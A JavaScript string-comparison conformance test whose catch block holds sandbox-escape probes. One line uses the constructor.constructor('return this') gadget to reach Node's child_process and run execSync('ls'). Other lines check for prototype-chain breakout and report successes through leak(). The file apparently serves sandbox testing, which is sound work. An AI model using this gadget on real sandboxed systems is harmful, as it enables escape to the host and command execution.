try {
    if ('xy' > 'xx' !== true) {
        $ERROR('#1: ("xy" > "xx") === true');
    }
    if ('xx' > 'xy' !== false) {
        $ERROR('#2: ("xx" > "xy") === false');
    }
    if ('y' > 'x' !== true) {
        $ERROR('#3: ("y" > "x") === true');
    }
    if ('aba' > 'aab' !== true) {
        $ERROR('#4: ("aba" > aab") === true');
    }
    if ('aaaa' > 'aaab' !== false) {
        $ERROR('#5: ("\\u0061\\u0061\\u0061\\u0061" > \\u0061\\u0061\\u0061\\u0062") === false');
    }
    if ('a\0b' > 'a\0a' !== true) {
        $ERROR('#6: ("a\\u0000b" > "a\\u0000a") === true');
    }
    if ('aa' > 'aB' !== true) {
        $ERROR('#7: ("aa" > aB") === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}